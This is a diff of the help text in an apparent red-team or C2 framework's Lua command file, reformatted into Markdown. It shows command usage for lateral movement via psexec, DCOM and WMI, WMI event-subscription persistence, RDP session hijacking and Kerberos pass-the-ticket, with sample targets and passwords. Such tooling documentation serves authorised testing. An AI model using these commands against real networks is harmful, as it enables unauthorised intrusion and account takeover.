@@ -57,18 +57,21 @@ cmd_ps_exec:Flags():String("path", "", "local path to service executable")
 opsec("move:psexec", 9.0)
 
 help("move:psexec", [[
-Positional arguments format:
-  move psexec DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe
-  move psexec 192.168.1.100 TestService C:\tools\service.exe
+**Positional arguments format:**
 
-Flag format:
-  move psexec --host DOMAIN-DC --service AgentSvc --path /tmp/MyAgentSvc.exe
-  move psexec --host 192.168.1.100 --service TestService --path C:\tools\service.exe
+```
+move psexec DOMAIN-DC AgentSvc /tmp/MyAgentSvc.exe
+move psexec 192.168.1.100 TestService C:\tools\service.exe
+```
 
-Note:
-- Requires administrator privileges on target host
-- Service executable will be copied to C:\Windows\ on target
-- Service will be created and started automatically
+**Flag format:**
+
+```
+move psexec --host DOMAIN-DC --service AgentSvc --path /tmp/MyAgentSvc.exe
+move psexec --host 192.168.1.100 --service TestService --path C:\tools\service.exe
+```
+
+> Requires administrator privileges on target host. Service executable will be copied to C:\Windows\ on target.
 ]])
 
 -- dcom
@@ -133,21 +136,26 @@ cmd_dcom:Flags():String("domain", "", "domain")
 opsec("move:dcom", 7.5)
 
 help("move:dcom", [[
-Positional arguments format:
-  move dcom 192.168.1.100 "c:\windows\system32\calc.exe"
-  move dcom DOMAIN-DC "c:\windows\system32\cmd.exe" "/c whoami"
+**Positional arguments format:**
 
-Flag format (current user):
-  move dcom --target 192.168.1.100 --cmd "c:\windows\system32\calc.exe"
+```
+move dcom 192.168.1.100 "c:\windows\system32\calc.exe"
+move dcom DOMAIN-DC "c:\windows\system32\cmd.exe" "/c whoami"
+```
 
-Flag format (explicit credentials):
-  move dcom --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --cmd "c:\windows\system32\cmd.exe" --parameters "/c whoami"
+**Flag format (current user):**
 
-Note:
-- Uses DCOM (Distributed Component Object Model) for lateral movement
-- If username is empty, uses current user credentials
-- Default command is cmd.exe if not specified
-- Requires appropriate permissions on target host
+```
+move dcom --target 192.168.1.100 --cmd "c:\windows\system32\calc.exe"
+```
+
+**Flag format (explicit credentials):**
+
+```
+move dcom --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --cmd "c:\windows\system32\cmd.exe" --parameters "/c whoami"
+```
+
+> Uses DCOM for lateral movement. If username is empty, uses current user credentials. Default command is cmd.exe.
 ]])
 
 
@@ -222,26 +230,32 @@ cmd_wmi_proccreate:Flags():String("domain", "", "domain")
 opsec("move:wmi-proccreate", 7.0)
 
 help("move:wmi-proccreate", [[
-Positional arguments format (current user):
-  move wmi-proccreate 192.168.1.100 "calc.exe"
-  move wmi-proccreate DOMAIN-DC "powershell.exe -c whoami"
+**Positional arguments format (current user):**
 
-Positional arguments format (explicit credentials):
-  move wmi-proccreate 192.168.1.100 "calc.exe" admin P@ssw0rd CONTOSO
-  move wmi-proccreate DOMAIN-DC "cmd.exe /c dir" administrator Password123 DOMAIN
+```
+move wmi-proccreate 192.168.1.100 "calc.exe"
+move wmi-proccreate DOMAIN-DC "powershell.exe -c whoami"
+```
 
-Flag format (current user):
-  move wmi-proccreate --target 192.168.1.100 --command "calc.exe"
+**Positional arguments format (explicit credentials):**
 
-Flag format (explicit credentials):
-  move wmi-proccreate --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --command "powershell.exe -c whoami"
+```
+move wmi-proccreate 192.168.1.100 "calc.exe" admin P@ssw0rd CONTOSO
+```
 
-Note:
-- Uses WMI Win32_Process Create method for lateral movement
-- If username is empty, uses current user credentials
-- WMI path will be automatically constructed as \\target\ROOT\CIMV2
-- x86 architecture is not supported
-- Requires appropriate WMI permissions on target host
+**Flag format (current user):**
+
+```
+move wmi-proccreate --target 192.168.1.100 --command "calc.exe"
+```
+
+**Flag format (explicit credentials):**
+
+```
+move wmi-proccreate --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --command "powershell.exe -c whoami"
+```
+
+> Uses WMI Win32_Process Create method. If username is empty, uses current user credentials. x86 not supported.
 ]])
 
 
@@ -323,28 +337,31 @@ cmd_wmi_eventsub:Flags():String("domain", "", "domain")
 opsec("move:wmi-eventsub", 8.0)
 
 help("move:wmi-eventsub", [[
-Positional arguments format (current user):
-  move wmi-eventsub 192.168.1.100 /tmp/payload.vbs
-  move wmi-eventsub DOMAIN-DC C:\tools\script.vbs
+**Positional arguments format (current user):**
 
-Positional arguments format (explicit credentials):
-  move wmi-eventsub 192.168.1.100 /tmp/payload.vbs admin P@ssw0rd CONTOSO
-  move wmi-eventsub DOMAIN-DC C:\tools\script.vbs administrator Password123 DOMAIN
+```
+move wmi-eventsub 192.168.1.100 /tmp/payload.vbs
+```
 
-Flag format (current user):
-  move wmi-eventsub --target 192.168.1.100 --script /tmp/payload.vbs
+**Positional arguments format (explicit credentials):**
 
-Flag format (explicit credentials):
-  move wmi-eventsub --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --script /tmp/payload.vbs
+```
+move wmi-eventsub 192.168.1.100 /tmp/payload.vbs admin P@ssw0rd CONTOSO
+```
 
-Note:
-- Uses WMI Event Subscription for persistent VBScript execution
-- VBScript will be executed via WMI event consumer
-- If username is empty, uses current user credentials
-- WMI path will be automatically constructed as \\target\ROOT\SUBSCRIPTION
-- x86 architecture is not supported
-- Higher OPSEC risk (8.0) due to persistence mechanism
-- Requires appropriate WMI permissions on target host
+**Flag format (current user):**
+
+```
+move wmi-eventsub --target 192.168.1.100 --script /tmp/payload.vbs
+```
+
+**Flag format (explicit credentials):**
+
+```
+move wmi-eventsub --target 192.168.1.100 --username admin --password P@ssw0rd --domain CONTOSO --script /tmp/payload.vbs
+```
+
+> Uses WMI Event Subscription for persistent VBScript execution. If username is empty, uses current user credentials. x86 not supported.
 ]])
 
 
@@ -419,35 +436,39 @@ bind_flags_completer(cmd_rdphijack, { mode = values_completer({"password", "serv
 opsec("move:rdphijack", 9.5)
 
 help("move:rdphijack", [[
-Positional arguments format:
+**Positional arguments format:**
 
 Redirect session 2 to session 1 (requires SYSTEM privilege):
-  move rdphijack 1 2
 
-Redirect session 2 to session 1 with password (requires high integrity):
-  move rdphijack 1 2 password P@ssw0rd123
+```
+move rdphijack 1 2
+```
 
-Redirect session 2 to session 1 on remote server (requires user token/ticket):
-  move rdphijack 1 2 server SQL01.lab.internal
+With password (requires high integrity):
 
-Flag format:
-  move rdphijack --session 1 --target 2
-  move rdphijack --session 1 --target 2 --mode password --argument P@ssw0rd123
-  move rdphijack --session 1 --target 2 --mode server --argument SQL01.lab.internal
+```
+move rdphijack 1 2 password P@ssw0rd123
+```
 
-Modes:
-  (none)    - Direct hijack, requires SYSTEM privilege
-  password  - Use password of target session owner, requires high integrity beacon
-  server    - Remote server hijack, requires token/ticket of session owner
+On remote server (requires user token/ticket):
 
-Note:
-- Uses RDP Session Hijacking technique for lateral movement
-- Very high OPSEC risk (9.5) - actively hijacks user sessions
-- Different modes require different privilege levels:
-  * No mode: SYSTEM privilege required
-  * password mode: High integrity beacon required
-  * server mode: Valid token/ticket of target session owner required
-- Session IDs can be enumerated with 'query user' or similar commands
+```
+move rdphijack 1 2 server SQL01.lab.internal
+```
+
+**Flag format:**
+
+```
+move rdphijack --session 1 --target 2
+move rdphijack --session 1 --target 2 --mode password --argument P@ssw0rd123
+move rdphijack --session 1 --target 2 --mode server --argument SQL01.lab.internal
+```
+
+**Modes:**
+
+- `(none)` - Direct hijack, requires SYSTEM privilege
+- `password` - Use password of target session owner, requires high integrity
+- `server` - Remote server hijack, requires token/ticket of session owner
 ]])
 
 -- krb_ptt (Kerberos Pass-the-Ticket)
@@ -528,51 +549,37 @@ opsec("move:krb_ptt", 7.0)
 help("move:krb_ptt", [[
 Kerberos Pass-the-Ticket (PTT) - Submit a TGT or TGS ticket for authentication.
 
-Positional arguments format:
-  move krb_ptt <base64_ticket>
-  move krb_ptt <base64_ticket> <luid>
+**Positional arguments format:**
 
-Flag format (direct base64):
-  move krb_ptt --ticket <base64_ticket>
-  move krb_ptt --ticket <base64_ticket> --luid <luid>
+```
+move krb_ptt <base64_ticket>
+move krb_ptt <base64_ticket> <luid>
+```
 
-Flag format (from file):
-  move krb_ptt --ticket-file /path/to/ticket.kirbi
-  move krb_ptt --ticket-base64-file /path/to/ticket.txt --luid 0x3e7
+**Flag format (direct base64):**
 
-Examples:
-  # Direct base64 input
-  move krb_ptt doIFpDCCBaC...ggg==
-  move krb_ptt --ticket doIFpDCCBaC...ggg== --luid 0x3e7
+```
+move krb_ptt --ticket <base64_ticket>
+move krb_ptt --ticket <base64_ticket> --luid 0x3e7
+```
 
-  # From raw binary .kirbi file (auto-encodes to base64)
-  move krb_ptt --ticket-file /tmp/administrator.kirbi
-  move krb_ptt --ticket-file C:\tickets\user.kirbi --luid 0x3e7
+**Flag format (from file):**
 
-  # From base64 text file
-  move krb_ptt --ticket-base64-file /tmp/ticket_base64.txt
-  move krb_ptt --ticket-base64-file C:\tickets\ticket.b64 --luid 0x3e7
+```
+move krb_ptt --ticket-file /path/to/ticket.kirbi
+move krb_ptt --ticket-base64-file /path/to/ticket.txt --luid 0x3e7
+```
 
-Parameters:
-  --ticket              - Base64 encoded Kerberos ticket (direct input)
-  --ticket-file         - Path to raw binary ticket file (.kirbi format)
-  --ticket-base64-file  - Path to file containing base64 encoded ticket
-  --luid                - Optional target Logon Session ID (LUID)
-                          If not specified, uses current session
+**Parameters:**
 
-Priority: --ticket > --ticket-base64-file > --ticket-file
+- `--ticket` - Base64 encoded Kerberos ticket (direct input)
+- `--ticket-file` - Path to raw binary ticket file (.kirbi format)
+- `--ticket-base64-file` - Path to file containing base64 encoded ticket
+- `--luid` - Optional target Logon Session ID (LUID)
 
-Note:
-- Implements Kerberos Pass-the-Ticket attack
-- Ticket can be TGT (Ticket Granting Ticket) or TGS (Service Ticket)
-- LUID format: hexadecimal (e.g., 0x3e7) or decimal (e.g., 999)
-- Requires appropriate privileges to inject into target LUID
-- Ticket sources:
-  * Rubeus: dump, asktgt, asktgs (outputs base64)
-  * Mimikatz: sekurlsa::tickets /export (outputs .kirbi)
-  * impacket: getTGT.py, getST.py (outputs .ccache, convert to .kirbi)
+Priority: `--ticket` > `--ticket-base64-file` > `--ticket-file`
 
-Credit: Kerbeus PTT by RalfHacker
+> Ticket sources: Rubeus (base64), Mimikatz (.kirbi), impacket (.ccache → .kirbi).
 ]])
 
 
